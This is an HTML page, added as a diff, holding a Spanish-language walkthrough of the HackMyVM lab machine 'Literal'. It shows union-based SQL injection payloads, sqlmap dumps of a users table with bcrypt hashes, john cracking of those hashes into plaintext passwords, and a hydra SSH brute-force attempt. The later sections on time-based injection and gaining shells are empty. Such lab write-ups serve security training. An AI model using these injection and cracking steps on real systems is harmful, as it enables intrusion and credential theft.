@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackMyVM Literal</title>
+
+  <meta name="description" content="Resolución de la máquina Literal de la plataforma de HackMyVM">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackMyVM Literal">
+  <meta name="twitter:description" content="Resolución de la máquina Literal de la plataforma de HackMyVM">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/logo.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackMyVM Literal">
+  <meta property="og:description" content="Resolución de la máquina Literal de la plataforma de HackMyVM">
+  <meta property="og:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/logo.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/logo.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="canonical" href="http://localhost:4000/">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackMyVM Literal" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/hmv" title="GatoGamer1155" class="blog-button">HackMyVM</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#sqli-union">Sqli - union</a></li>
+        <li><a href="#sqli-time">Sqli - time</a></li>
+        <li><a href="#shell-carlos">Shell - carlos</a></li>
+        <li><a href="#shell-root">Shell - root</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackMyVM</h4>
+    <picture><img src="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/logo.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Literal</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos solo 2 puertos abiertos, donde corren los servicios <code class="language-plaintext highlighter-rouge">ssh</code> y <code class="language-plaintext highlighter-rouge">http</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">192.168.100.87
+Nmap scan report for 192.168.100.87  
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Tramitando una simple petición con <code class="language-plaintext highlighter-rouge">curl</code> hacia la web, en las <code class="language-plaintext highlighter-rouge">cabeceras</code> de respuesta podemos encontrar que la web nos redirige al dominio <code class="language-plaintext highlighter-rouge">blog.literal.hmv</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl </span><span class="p">192.168.100.87 -I
+HTTP/1.1 301 Moved Permanently
+Date: Fri, 05 May 2023 04:28:59 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Location: http://blog.literal.hmv
+Content-Type: text/html; charset=iso-8859-1  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya que estamos en local debemos agregar el <code class="language-plaintext highlighter-rouge">dominio</code> junto con la ip al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> para al apuntar a el la máquina local sepa a donde <code class="language-plaintext highlighter-rouge">resolver</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="am">"192.168.100.87 blog.literal.hmv"</span><span class="p"> | </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al abrir la página web desde el <code class="language-plaintext highlighter-rouge">dominio</code> nos encontramos con algunas <code class="language-plaintext highlighter-rouge">pestañas</code></p>
+<a href="/hmv/literal/1.png" target="_blank"><div><p><img src="/hmv/literal/1.png"></p></div></a>
+
+<p class="plain-text">Podemos ver la pestaña <code class="language-plaintext highlighter-rouge">login</code> la cual al abrirla nos lleva a un panel de autenticación y aunque no tenemos <code class="language-plaintext highlighter-rouge">credenciales</code> podemos darle clic al botón <code class="language-plaintext highlighter-rouge">Sign Up</code></p>
+<a href="/hmv/literal/2.png" target="_blank"><div><p><img src="/hmv/literal/2.png"></p></div></a>
+
+<p class="plain-text">Podemos <code class="language-plaintext highlighter-rouge">registrar</code> un usuario nuevo, en este caso usaremos <code class="language-plaintext highlighter-rouge">testing</code> tanto con el usuario como con la contraseña, volvemos al <code class="language-plaintext highlighter-rouge">login</code> e iniciamos sesión con el</p>
+<a href="/hmv/literal/3.png" target="_blank"><div><p><img src="/hmv/literal/3.png"></p></div></a>
+<a href="/hmv/literal/4.png" target="_blank"><div><p><img src="/hmv/literal/4.png"></p></div></a>
+
+<p class="plain-text">Al autenticarnos podemos ver un <code class="language-plaintext highlighter-rouge">dashboard</code> ademas algunos botones, uno de ellos es para ver la lista de los <code class="language-plaintext highlighter-rouge">proyectos</code> en los que esta trabajando el usuario</p>
+<a href="/hmv/literal/5.png" target="_blank"><div><p><img src="/hmv/literal/5.png"></p></div></a>
+<a href="/hmv/literal/6.png" target="_blank"><div><p><img src="/hmv/literal/6.png"></p></div></a>
+
+<p class="plain-text">Podemos ver una tabla y <code class="language-plaintext highlighter-rouge">filtrar</code> en la barra por el <code class="language-plaintext highlighter-rouge">estado</code> del proyecto, cualquiera de los que esta a la derecha deberia funcionar, en este caso podemos usar <code class="language-plaintext highlighter-rouge">Done</code></p>
+<a href="/hmv/literal/7.png" target="_blank"><div><p><img src="/hmv/literal/7.png"></p></div></a>
+
+</section>
+
+<section class="post" id="sqli-union">
+<br><h3 class="post-title">SQL Injection - Union Based</h3><br>
+
+<p class="plain-text">Después de un rato notamos una inyección <code class="language-plaintext highlighter-rouge">sql</code>, despues de iterar sobre varias <code class="language-plaintext highlighter-rouge">columnas</code> podemos ver que existen las <code class="language-plaintext highlighter-rouge">5</code> que se ven <code class="language-plaintext highlighter-rouge">reflejadas</code> en la web</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="s">Done' </span><span class="o">order by </span><span class="mi">5</span><span class="c1">-- -  </span>
+</code></pre></div></div><br>
+<a href="/hmv/literal/9.png" target="_blank"><div><p><img src="/hmv/literal/9.png"></p></div></a>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="s">' </span><span class="o">union select </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="c1">-- -  </span>
+</code></pre></div></div><br>
+<a href="/hmv/literal/10.png" target="_blank"><div><p><img src="/hmv/literal/10.png"></p></div></a>
+
+<p class="plain-text">Podemos usar cualquier columna para la <code class="language-plaintext highlighter-rouge">sqli</code> en este caso la 2 para en ella con <code class="language-plaintext highlighter-rouge">database()</code> nos devuelva el nombre de la <code class="language-plaintext highlighter-rouge">base de datos</code> actualmente en uso</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="s">' </span><span class="o">union select </span><span class="mi">1</span><span class="p">,database(),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="c1">-- -  </span>
+</code></pre></div></div><br>
+<a href="/hmv/literal/11.png" target="_blank"><div><p><img src="/hmv/literal/11.png"></p></div></a>
+
+<p class="plain-text">La base de datos en uso es <code class="language-plaintext highlighter-rouge">blog</code>, podemos enumerar todas las bases de datos <code class="language-plaintext highlighter-rouge">existentes</code>, sin embargo no hay mas que las bases de datos por <code class="language-plaintext highlighter-rouge">defecto</code> de mysql</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="s">' </span><span class="o">union select </span><span class="mi">1</span><span class="p">,schema_name,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="o"> from </span><span class="mi">information_schema</span><span class="p">.</span><span class="mi">schemata</span><span class="c1">-- -  </span>
+</code></pre></div></div><br>
+<a href="/hmv/literal/12.png" target="_blank"><div><p><img src="/hmv/literal/12.png"></p></div></a>
+
+<p class="plain-text">Ahora enumeramos los nombres de las <code class="language-plaintext highlighter-rouge">tablas</code> que existen en la base de datos <code class="language-plaintext highlighter-rouge">blog</code>, una almacena los <code class="language-plaintext highlighter-rouge">proyectos</code> la que nos podria interesar es la tabla <code class="language-plaintext highlighter-rouge">users</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="s">' </span><span class="o">union select </span><span class="mi">1</span><span class="p">,table_name,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="o"> from </span><span class="mi">information_schema</span><span class="p">.</span><span class="mi">tables</span><span class="o"> where </span><span class="p">table_schema</span><span class="o">=</span><span class="s">'blog'</span><span class="c1">-- -  </span>
+</code></pre></div></div><br>
+<a href="/hmv/literal/13.png" target="_blank"><div><p><img src="/hmv/literal/13.png"></p></div></a>
+
+<p class="plain-text">Ahora que sabemos que existe, enumeramos las <code class="language-plaintext highlighter-rouge">columnas</code> existentes especificando la tabla <code class="language-plaintext highlighter-rouge">users</code> de la base de datos <code class="language-plaintext highlighter-rouge">blog</code>, encontramos <code class="language-plaintext highlighter-rouge">5</code> columnas en total</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="s">' </span><span class="o">union select </span><span class="mi">1</span><span class="p">,column_name,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="o"> from </span><span class="mi">information_schema</span><span class="p">.</span><span class="mi">columns</span><span class="o"> where </span><span class="p">table_schema</span><span class="o">=</span><span class="s">'blog'</span><span class="o"> and </span><span class="p">table_name</span><span class="o">=</span><span class="s">'users'</span><span class="c1">-- -  </span>
+</code></pre></div></div><br>
+<a href="/hmv/literal/22.png" target="_blank"><div><p><img src="/hmv/literal/22.png"></p></div></a>
+
+<p class="plain-text">Podemos usar una <code class="language-plaintext highlighter-rouge">columna</code> para cada existente y asi ver <code class="language-plaintext highlighter-rouge">reflejados</code> todos los datos en la tabla <code class="language-plaintext highlighter-rouge">users</code>, esto incluye <code class="language-plaintext highlighter-rouge">usuarios</code>, identificadores y sus respectivos <code class="language-plaintext highlighter-rouge">hashes</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="s">' </span><span class="o">union select </span><span class="p">usercreatedate,useremail,userid,username,userpassword</span><span class="o"> from </span><span class="p">users</span><span class="c1">-- -  </span>
+</code></pre></div></div><br>
+<a href="/hmv/literal/14.png" target="_blank"><div><p><img src="/hmv/literal/14.png"></p></div></a>
+
+<p class="plain-text">Otra forma es con <code class="language-plaintext highlighter-rouge">sqlmap</code>, con <code class="language-plaintext highlighter-rouge">burpsuite</code> interceptamos la petición para ver como se tramita, esto incluye la <code class="language-plaintext highlighter-rouge">data</code> enviada por POST y la <code class="language-plaintext highlighter-rouge">cookie</code> que necesitamos</p>
+<a href="/hmv/literal/15.png" target="_blank"><div><p><img src="/hmv/literal/15.png"></p></div></a>
+
+<p class="plain-text">Ahora con <code class="language-plaintext highlighter-rouge">sqlmap</code> definimos la petición indicando como se tramita la <code class="language-plaintext highlighter-rouge">data</code> y la <code class="language-plaintext highlighter-rouge">cookie</code> del usuario, con el parametro <code class="language-plaintext highlighter-rouge">-dbs</code> podemos enumerar las bases de datos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sqlmap</span><span class="p"> --batch --url http://blog.literal.hmv/next_projects_to_do.php --cookie PHPSESSID=t77t8gmfi9j2mhlp1f2i14rblu --data sentence-query=Done -dbs  
+</span><span class="am">        ___
+       __H__
+ ___ ___[</span><span class="ro">.</span><span class="am">]_____ ___ ___  </span><span class="p">{</span><span class="c1">1.7.2#stable</span><span class="p">}
+</span><span class="am">|_ -| . [</span><span class="ro">(</span><span class="am">]     | .'| . |
+</span><span class="am">|___|_  [</span><span class="ro">,</span><span class="am">]_|_|_|__,|  _|
+</span><span class="am">      |_|V...       |_|   </span><span class="p">https://sqlmap.org
+
+[</span><span class="az">23:08:02</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resuming back-end DBMS 'mysql' 
+[</span><span class="az">23:08:02</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] testing connection to the target URL
+[</span><span class="az">23:08:02</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] the back-end DBMS is MySQL
+[</span><span class="az">23:08:02</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] fetching database names
+available databases [4]:
+[*] blog
+[*] information_schema
+[*] mysql
+[*] performance_schema</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos ver todas, con el parametro <code class="language-plaintext highlighter-rouge">-D</code> indicamos la base de datos <code class="language-plaintext highlighter-rouge">blog</code> y usando <code class="language-plaintext highlighter-rouge">-tables</code> podemos dumpear las <code class="language-plaintext highlighter-rouge">tablas</code> existentes de la base de datos indicada</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sqlmap</span><span class="p"> --batch --url http://blog.literal.hmv/next_projects_to_do.php --cookie PHPSESSID=t77t8gmfi9j2mhlp1f2i14rblu --data sentence-query=Done -D blog -tables  
+</span><span class="am">        ___
+       __H__
+ ___ ___[</span><span class="ro">.</span><span class="am">]_____ ___ ___  </span><span class="p">{</span><span class="c1">1.7.2#stable</span><span class="p">}
+</span><span class="am">|_ -| . [</span><span class="ro">(</span><span class="am">]     | .'| . |
+</span><span class="am">|___|_  [</span><span class="ro">,</span><span class="am">]_|_|_|__,|  _|
+</span><span class="am">      |_|V...       |_|   </span><span class="p">https://sqlmap.org
+
+[</span><span class="az">23:08:03</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resuming back-end DBMS 'mysql'
+[</span><span class="az">23:08:03</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] testing connection to the target URL
+[</span><span class="az">23:08:03</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] the back-end DBMS is MySQL
+[</span><span class="az">23:08:03</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] fetching tables for database: 'blog'
+Database: blog
+[2 tables]
++----------+
+| projects |
+| users    |
++----------+</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Indicamos con <code class="language-plaintext highlighter-rouge">-T</code> la tabla <code class="language-plaintext highlighter-rouge">users</code> existente y usando el parametro <code class="language-plaintext highlighter-rouge">-dump</code> podemos dumpear absolutamente todo el <code class="language-plaintext highlighter-rouge">contenido</code> de todas las columnas existentes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sqlmap</span><span class="p"> --batch --url http://blog.literal.hmv/next_projects_to_do.php --cookie PHPSESSID=t77t8gmfi9j2mhlp1f2i14rblu --data sentence-query=Done -D blog -T users -dump  
+</span><span class="am">        ___
+       __H__
+ ___ ___[</span><span class="ro">.</span><span class="am">]_____ ___ ___  </span><span class="p">{</span><span class="c1">1.7.2#stable</span><span class="p">}
+</span><span class="am">|_ -| . [</span><span class="ro">(</span><span class="am">]     | .'| . |
+</span><span class="am">|___|_  [</span><span class="ro">,</span><span class="am">]_|_|_|__,|  _|
+</span><span class="am">      |_|V...       |_|   </span><span class="p">https://sqlmap.org
+
+[</span><span class="az">23:08:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resuming back-end DBMS 'mysql'
+[</span><span class="az">23:08:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] testing connection to the target URL
+[</span><span class="az">23:08:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] the back-end DBMS is MySQL
+[</span><span class="az">23:08:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] fetching entries for table 'users' in database 'blog'
+Database: blog
+Table: users
+[18 entries]
++--------+-----------+----------------------------------+--------------------------------------------------------------+---------------------+
+| userid | username  | useremail                        | userpassword                                                 | usercreatedate      |
++--------+-----------+----------------------------------+--------------------------------------------------------------+---------------------+
+| 1      | test      | test@blog.literal.htb            | $2y$10$wWhvCz1pGsKm..jh/lChIOA7aJoZRAil40YKlGFiw6B.6a77WzNma | 2023-04-07 17:21:47 |
+| 2      | admin     | admin@blog.literal.htb           | $2y$10$fjNev2yv9Bi1IQWA6VOf9Owled5hExgUZNoj8gSmc7IdZjzuOWQ8K | 2023-04-07 17:21:47 |
+| 3      | carlos    | carlos@blog.literal.htb          | $2y$10$ikI1dN/A1lhkKLmiKl.cJOkLiSgPUPiaRoopeqvD/.p.bh0w.bJBW | 2023-04-07 17:21:48 |
+| 4      | freddy123 | freddy123@zeeli.moc              | $2y$10$yaf9nZ6UJkf8103R8rMdtOUC.vyZUek4vXVPas3CPOb4EK8I6eAUK | 2023-04-07 17:21:48 |
+| 5      | jorg3_M   | jorg3_M@zeeli.moc                | $2y$10$lZ./Zflz1EEFdYbWp7VUK.415Ni8q9kYk3LJ2nF0soRJG1RymtDzG | 2023-04-07 17:21:48 |
+| 6      | aNdr3s1to | aNdr3s1to@puertonacional.ply     | $2y$10$F2Eh43xkXR/b0KaGFY5MsOwlnh4fuEZX3WNhT3PxSw.6bi/OBA6hm | 2023-04-07 17:21:48 |
+| 7      | kitty     | kitty@estadodelarte.moc          | $2y$10$rXliRlBckobgE8mJTZ7oXOaZr4S2NSwqinbUGLcOfCWDra6v9bxcW | 2023-04-07 17:21:48 |
+| 8      | walter    | walter@forumtesting.literal.hmv  | $2y$10$er9GaSRv1AwIwu9O.tlnnePNXnzDfP7LQMAUjW2Ca1td3p0Eve6TO | 2023-04-07 17:21:48 |
+| 9      | estefy    | estefy@caselogic.moc             | $2y$10$hBB7HeTJYBAtdFn7Q4xzL.WT3EBMMZcuTJEAvUZrRe.9szCp19ZSa | 2023-04-07 17:21:48 |
+| 10     | michael   | michael@without.you              | $2y$10$sCbKEWGgAUY6a2Y.DJp8qOIa250r4ia55RMrDqHoRYU3Y7pL2l8Km | 2023-04-07 17:21:48 |
+| 11     | r1ch4rd   | r1ch4rd@forumtesting.literal.hmv | $2y$10$7itXOzOkjrAKk7Mp.5VN5.acKwGi1ziiGv8gzQEK7FOFLomxV0pkO | 2023-04-07 17:21:48 |
+| 12     | fel1x     | fel1x@without.you                | $2y$10$o06afYsuN8yk0yoA.SwMzucLEavlbI8Rl43.S0tbxL.VVSbsCEI0m | 2023-04-07 17:21:48 |
+| 13     | kelsey    | kelsey@without.you               | $2y$10$vxN98QmK39rwvVbfubgCWO9W2alVPH4Dp4Bk7DDMWRvfN995V4V6. | 2023-04-07 17:21:48 |
+| 14     | jtx       | jtx@tiempoaltiempo.hy            | $2y$10$jN5dt8syJ5cVrlpotOXibeNC/jvW0bn3z6FetbVU/CeFtKwhdhslC | 2023-04-07 17:21:48 |
+| 15     | DRphil    | DRphil@alcaldia-tol.gob          | $2y$10$rW58MSsVEaRqr8uIbUeEeuDrYB6nmg7fqGz90rHYHYMt2Qyflm1OC | 2023-04-07 17:21:48 |
+| 16     | carm3N    | carm3N@estadodelarte.moc         | $2y$10$D7uF6dKbRfv8U/M/mUj0KujeFxtbj6mHCWT5SaMcug45u7lo/.RnW | 2023-04-07 17:21:48 |
+| 17     | lanz      | lanz@literal.htb                 | $2y$10$PLGN5.jq70u3j5fKpR8R6.Zb70So/8IWLi4e69QqJrM8FZvAMf..e | 2023-04-07 17:55:36 |
+| 18     | testing   | test@test.test                   | $2y$10$tUnS0IJxE2pxC2qmusgp4uLhWtoLWFZKlO0lFOKQwZEsrajti7cbC | 2023-04-20 22:59:43 |
++--------+-----------+----------------------------------+--------------------------------------------------------------+---------------------+</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Guardamos los <code class="language-plaintext highlighter-rouge">hashes</code> en un archivo y con <code class="language-plaintext highlighter-rouge">john</code> aplicamos fuerza bruta, aunque podemos conseguir varias <code class="language-plaintext highlighter-rouge">credenciales</code> el proceso es demasiado <code class="language-plaintext highlighter-rouge">tardado</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hashes
+Using default input encoding: UTF-8
+Loaded 18 password hashes with 18 different salts (bcrypt [Blowfish 32/64 X3])  
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">123456789</span><span class="p">        (</span><span class="am">freddy123</span><span class="p">)
+</span><span class="am">butterfly</span><span class="p">        (</span><span class="am">estefy</span><span class="p">)
+</span><span class="am">monica</span><span class="p">           (</span><span class="am">r1ch4rd</span><span class="p">)
+</span><span class="am">hellokitty</span><span class="p">       (</span><span class="am">kitty</span><span class="p">)
+</span><span class="am">50cent</span><span class="p">           (</span><span class="am">DRphil</span><span class="p">)
+</span><span class="am">slipknot</span><span class="p">         (</span><span class="am">jorg3_M</span><span class="p">)
+</span><span class="am">michael1</span><span class="p">         (</span><span class="am">michael</span><span class="p">)
+</span><span class="am">147258369</span><span class="p">        (</span><span class="am">fel1x</span><span class="p">)
+</span><span class="am">kelsey</span><span class="p">           (</span><span class="am">kelsey</span><span class="p">)
+</span><span class="am">741852963</span><span class="p">        (</span><span class="am">walter</span><span class="p">)
+</span><span class="am">zxcvbnm,./</span><span class="p">       (</span><span class="am">jtx</span><span class="p">)
+</span><span class="am">carlos12</span><span class="p">         (</span><span class="am">carlos</span><span class="p">)
+Use the "--show" option to display all of the cracked passwords reliably
+Session aborted</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Esto nos deja varias <code class="language-plaintext highlighter-rouge">credenciales</code>, las guardamos en un archivo y con <code class="language-plaintext highlighter-rouge">hydra</code> aplicamos fuerza bruta contra <code class="language-plaintext highlighter-rouge">ssh</code>, sin embargo no conseguimos ninguna válida</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ cat</span><span class="p"> credentials   
+carlos:carlos12
+freddy123:123456789
+jorg3_M:slipknot
+kitty:hellokitty
+walter:741852963
+estefy:butterfly
+michael:michael1
+r1ch4rd:monica
+fel1x:147258369
+kelsey:kelsey
+jtx:zxcvbnm,./
+DRphil:50cent</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ hydra</span><span class="p"> -C credentials ssh://192.168.100.87
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
+[DATA] max 12 tasks per 1 server, overall 12 tasks, 12 login tries  
+[DATA] attacking ssh://192.168.100.87:22/
+1 of 1 target completed, 0 valid password found
+ydra (https://github.com/vanhauser-thc/thc-hydra) finished</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="sqli-time">
+<br><h3 class="post-title">SQL Injection - Time Based</h3><br>
+
+
+</section>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
